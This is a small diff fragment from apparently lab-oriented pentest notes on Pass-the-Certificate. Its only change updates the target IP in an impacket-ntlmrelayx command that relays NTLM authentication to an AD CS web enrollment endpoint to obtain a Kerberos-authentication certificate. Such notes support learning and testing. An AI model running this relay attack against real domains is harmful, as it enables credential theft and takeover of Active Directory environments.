@@ -143,7 +143,7 @@ Pass-the-Certificate
 Impacket's `ntlmrelayx` can listen for inbound authentication and relay it to the AD CS web enrollment endpoint.
 
 ```bash
-impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 ```
 
 ### 🔎 Important options
